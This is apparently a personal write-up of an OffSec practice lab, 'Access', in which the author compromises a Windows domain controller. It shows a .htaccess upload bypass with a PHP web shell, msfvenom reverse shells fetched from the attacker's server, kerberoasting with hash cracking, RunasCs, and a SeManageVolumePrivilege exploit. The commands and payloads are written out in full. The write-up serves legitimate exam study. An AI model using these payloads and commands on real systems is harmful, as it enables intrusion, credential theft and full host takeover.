---
title: "Access"
date: 10-01-2026
categories: [Offsec, Windows Offsec, Active]
tags: [File Upload, AD, SeManageVolumePrivilege, Lateral Movement, RunasCS, PHP, .htaccess]
image: /assets/images/access/icon.jpg
---

Access if an Offsec lab which I am using to practice for the OSCP exam, which I will hopefully be attempting later in february. An nmap scan shows that the machine is a domain controller. The webpage which is running on port 80 is vulnerable to a file upload attack. The page correctly restricts any php extension but it can be bypassed by uploading a `.htaccess` file. This allows us to execute php code and we achieve RCE. After upgrading our shell we can snoop around in the DC which reveals another local user, svc_mssql, this user is vulnerable to kerberoasting, after retrieving the hash and cracking it we can run commands as this new user. svc_mssql has the `SeManageVolumePrivilege` attribute which allows us to read the entire file system using an exploit.

## Enumeration

As always we can start by running an nmap scan to reveal which ports are open on this machine.
```
nmap 192.168.128.187 -p- --min-rate 2000 -v -Pn -n -oN nmap
# Nmap 7.95 scan initiated Tue Jan  6 12:19:33 2026 as: /usr/lib/nmap/nmap --privileged -p- --min-rate 2000 -v -Pn -n -oN nmap 192.168.128.187
Nmap scan report for 192.168.128.187
Host is up (0.044s latency).
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
```

Port 88 and 389 being open indicate that this is domain controller.  Other ports of interest are port 80 which may be hosting a webpage and 445 for SMB. I try a quick guest authentication for SMB using netexec to see if am able to read any shares or authenticate but the guest user is disabled. 

```
netexec smb 192.168.217.187 -u guest -p '' --shares                
SMB         192.168.217.187 445    SERVER           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SERVER) (domain:access.offsec) (signing:True) (SMBv1:None)
SMB         192.168.217.187 445    SERVER           [-] access.offsec\guest: STATUS_ACCOUNT_DISABLED 
```

Without a successful bind I focus my attention on the webpage which seems to be a very basic html page.
![alt text](/assets/images/access/page.png)

Snooping around the webpage we see that there is an upload form for buying tickets. 
![alt text](/assets/images/access/ticket.png)

This is already a nice discovery but before we dig into it lets enumerate the webpage a little bit more, I ran ffuf to try to see if there were any php endpoints. If we find any it would mean the webpage runs php code and we could use this to try to exploit the web upload form. 

```
ffuf -w /opt/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://192.168.217.187/FUZZ.php      

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.217.187/FUZZ.php
 :: Wordlist         : FUZZ: /opt/seclists/Discovery/Web-Content/raft-medium-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

<SNIP>
!!ticket!!                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 42ms]
.html_var_DE            [Status: 403, Size: 304, Words: 22, Lines: 10, Duration: 40ms]
.htpasswd               [Status: 403, Size: 304, Words: 22, Lines: 10, Duration: 38ms]
con                     [Status: 403, Size: 304, Words: 22, Lines: 10, Duration: 43ms]
<SNIP>
```

## Exploiting the File Upload

Great we see two php endpoints, ticket.php and con.php. This means that the website uses php and we can now try to exploit the upload form to see if we can upload a php shell. Lets upload a simple image to see the expected behavior. 
![alt text](/assets/images/access/success.png)

We see that the upload went through but a key step to exploiting a php web upload is to find out where or file got uploaded to. I took a guess that it would be in the `/uploads/` endpoint but we could have also found this out using ffuf. It is also nice that the uploads page is an open directory listing. 

![alt text](/assets/images/access/image.png)

Lets make a quick php web shell and save it to a file, we will then capture the request with burpsuite to see what extensions are allowed.

```php
<pre>
<?php
system($_GET['cmd']);
?>
</pre>
```

Using the `.php` extension on our file leads to the webserver blocking it. I also tried a lot of common php extensions like phar or phtml but they also got blocked.

![alt text](/assets/images/access/brup.png)

One workaround to this problem is to upload a .htaccess file. If this is allowed we would be overwritting the .htaccess placed by the webserver which would let us determine which extensions are allowed to execute php code. Lets try to upload the following .htaccess file:

```
AddHandler application/x-httpd-php .fresh
```

The upload worked, this means that any file ending in the `.fresh` extension will be interpreted as php. Let's try to upload a webshell with the same extension and see if it goes through. 

![alt text](/assets/images/access/brup2.png)

It seems like it worked, lets go to the `/uploads` folder and click on the shell.fresh file to see its behavior. 

![alt text](/assets/images/access/rce.png)

It worked! It errors out due to the cmd get parameter being empty, lets move to curl so we can execute some commands.

```
curl 'http://192.168.217.187/uploads/shell.fresh?cmd=whoami'
<pre>
!!access\svc_apache!!
</pre>
```

From here you could try to upload a proper webshell or try to get the server to execute a powershell reverse shell, I instead opted for creating a reverse shell with msfvenom and uploading it so it could be executed.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.181 LPORT=9001 -f exe > shell.exe
```

I started a python http server so the server could download the file, I saved it to `C:\Users\Public` because this is almost always writable by anyone. 

```
curl -G "http://192.168.217.187/uploads/shell.fresh" \
--data-urlencode "cmd=powershell -c wget http://192.168.45.181/shell.exe -o C:\Users\Public\shell.exe" 
<pre>
</pre>
```

We see that the server hit our webserver because we got a request to `/shell.exe`.
```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.217.187 - - [10/Jan/2026 14:09:57] "GET /shell.exe HTTP/1.1" 200 -
```

Lets start a listener on port 9001 and execute the reverse shell.
```
curl 'http://192.168.217.187/uploads/shell.fresh?cmd=C:\Users\Public\shell.exe'
```
```
nc -lvnp 9001
listening on [any] 9001 ...
connect to [192.168.45.181] from (UNKNOWN) [192.168.217.187] 52074
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\uploads>
```

## Lateral Movement to svc_mssql

We finally get a proper shell as svc_apache. There is one or two rabbit holes but you will not spend too much time on them (hopefully). Since this is a DC lets run SharpHound to enumerate what privileges does this user have.

![alt text](/assets/images/access/blood.png)

Bloodhound shows that another user is vulnerable to kerberoasting, I would normally do this from Linux but unfortunately we do not know the password of our current user so we will need to do this from Windows using Rubeus.exe. 

```
PS C:\Users\svc_apache> .\Rubeus.exe kerberoast /user:svc_mssql /nowrap                            
.\Rubeus.exe kerberoast /user:svc_mssql /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : svc_mssql
[*] Target Domain          : access.offsec
[*] Searching path 'LDAP://SERVER.access.offsec/DC=access,DC=offsec' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=svc_mssql)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : svc_mssql
[*] DistinguishedName      : CN=MSSQL,CN=Users,DC=access,DC=offsec
[*] ServicePrincipalName   : MSSQLSvc/DC.access.offsec
[*] PwdLastSet             : 5/21/2022 5:33:45 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec@access.offsec*$C41A6750F088BFE8E68AD2D43E811DF6$C63730D8352681CB3B4F98FE9D6DF282D74AFB4CE65D6842F3F0298B54621F4FCE75C12C32F7BCB2EFA568DB3C72C397A3EAE5668D77C5CABD4B71DC5E5B26FA6A83A823AE3247AA8824041D2A5B5734C7EB96B427E4EA373E6A0CA8AD1A23737F094289258557081053680B2E8320338FC76CB103308D4F3C8D330B134B91323E6D27D90BF3BB2239FC3F5CFBDE6C5B85778DC9352A29254BEB3FF87E53E501A7A4D73C07A6C9600587DD72F8C64527C01236116089683158FB2E464326FB48070418B7CFC6CEBCE22C11061073248242897B126E7060F5163F9EE5A9CB94FC487BB4EF128C03244E06F1B423F895F458A5E6D16E681261DE46B2F83AE14E0D40674FCECA6A819BBFE6F27D0068C448DFEEA0EA68AC13ECC5B4BB6FC5DE24B9AEBC10CA9B73941AD7DC827709C654707A4C8FE94C430BAA190E212021FC1705CA5711AD47AC38558C10213120693A58619B669FD4E682D077CFD0CEAAC38D1A3133E8BC5DD1F6ACAB76691CCCED955692C7005980B171A708B0274646AD78778F595A6250A76B9AB3B07C3584E6B0D584B914EEB48EE95FC6CC5D0997CB393A0B66E015BFAC79A3DD1F73B343FD4DE477FCC6B84DA7C14D8CD0A95AEB19791691C7D8B9F07B3B115B4B6E6E2850703CF5CB3DA774A38AAA217969C706B472F3F7D4AB9C69DFA0452DA0BC011D7E9C231FDDCB979C1CACFC2BEFAA68E7A0BEDB562C907A67898AE17D8CAD26829A402F56745226E39504B7264564DB46A56C610163E403C6607FFEFB03AA74A8E652E92D413DFB1320C495DC56565D7BCC9D60D98275D531480D2458A9F3DFFF9B8700FD1DDE65D4807869C4FBCEAB588A7742F1D9C5CD0AEBA50DD0833E87D0938E94853E20B5C5CC651716875B79BE475AA2A2AC1467FDB221E6B51847992B96D32D1477577CDF94A9734282E0B48E72C9DE035C2481AAF7E1FC36EABB0541C459205EEA676AD6E22904EF6BF5262905A858C260ADEA6FDB3B7561372A9CC5816CA20B8916AB2D9208F0085A1AD907059875D995021CE4B0525609E311F09F465FF8030E7C927F23B726552DB1E644A6F3C2EC6A3BE2BBF487FF8C316BFE06CA4775B2CC92D765F42BF20599E7FCD33377B3BEDFE64AEA64D61B4169F8540E96801C55734458235AA02CF898A819486A183C308E350DD310C5ECBF2D18981BA1A7A8A5A0BC6013787BCB6E1347C4084114DCBC52DD4152F5F379824F9ED56EAFEB04499990E7F2EE7928B2EC8E234EA60D392CC66DA9CCED00AB6794F659348C88DB3704016A11E3621B74F811621554F0E0DA0F9D61BD6435655FF5A084D824381F159DF6359403A0DB75F883C7F12B478B34FA4374D4BC8594AA6236407AB0A9429416154AB52E5B4426E88DF6F77628698BEA29A0741A2A30CDF5DF18FDEC7630F8EBF8990520764062465ACF38B0FB96884A6D667246ED813ABB7854AC86E75FD906D5DFC279F0C515162FA4FC425CDA3280AC7F9EEDEDB643E5344836AA0DB9BFA27B99B1EF3381B69FAF7C24500F1B7D8DB70FBC6EA48B84D4361D309F0409F606789852BC2D50E081258931DDCD0B34780FDE26DABC640A41F909C87037907CA5

```

We see that it worked and we can attempt to crack the hash using hashcat.

```
hashcat svc.hash /usr/share/wordlists/rockyou.txt

<SNIP>

$krb5tgs$23$*svc_mssql$<SNIP>:!!trustno1!!
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.ac...907ca5
Time.Started.....: Sat Jan 10 09:13:31 2026 (0 secs)
Time.Estimated...: Sat Jan 10 09:13:31 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)

<SNIP>
```

With new credentials I attempted to use netexec to enumerate the domain shares, and other information but I did not get any useful information, bloodhound also does not show any privileges that would immediately lead to compromising the domain. Instead, I tried to find a vulnerability in the local machine which was a bit tricky as the svc_mssql user does not winrm or rdp capabilities so I had to use RunasCs to run a reverse shell as this new user.

```
netexec winrm 192.168.217.187 -u svc_mssql -p 'trustno1'         
WINRM       192.168.217.187 5985   SERVER           [*] Windows 10 / Server 2019 Build 17763 (name:SERVER) (domain:access.offsec) 
WINRM       192.168.217.187 5985   SERVER           [-] access.offsec\svc_mssql:trustno1
```

Creating the same reverse shell (different port) as before and uploading it, I executed it using RunasCs which got me a session as this user, from which I could enumerate the DC better.

```
PS C:\Users\svc_apache> ./RunasCS.exe svc_mssql trustno1 "C:\Users\Public\shell2.exe"
./RunasCS.exe svc_mssql trustno1 "C:\Users\Public\shell2.exe"
[*] Warning: The logon for user 'svc_mssql' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

No output received from the process.
```

```
nc -lvnp 9002
listening on [any] 9002 ...
connect to [192.168.45.181] from (UNKNOWN) [192.168.217.187] 50790
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
access\svc_mssql
```

## Exploiting the SeManageVolume Privilege

Enumerating the privileges our new user has revels something interesting. This user has the SeManageVolumePrivilege enabled which lest us mount and modify file system volumes inside the computer.

```
PS C:\users\public> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State   
============================= ================================ ========
SeMachineAccountPrivilege     Add workstations to domain       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled 
!!SeManageVolumePrivilege!!       Perform volume maintenance tasks Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled`
```

A quick google search reveals that it is a very easy to exploit privilege escalation. I found the [following github project](https://github.com/CsEnox/SeManageVolumeExploit) which contains the executable which will grant us read and write permissions over the entire file system.

After downloading and executing it on the target I am able to read the flag on the administrator desktop. You could now also read the SAM and NTDS registry keys which 

```
PS C:\Users\svc_mssql> ./SeManageVolumeExploit.exe
./SeManageVolumeExploit.exe
Entries changed: 6

DONE 

PS C:\Users\svc_mssql> cat C:\Users\Administrator\Desktop\proof.txt
cat C:\Users\Administrator\Desktop\proof.txt
318df157cb8cd<SNIP>
```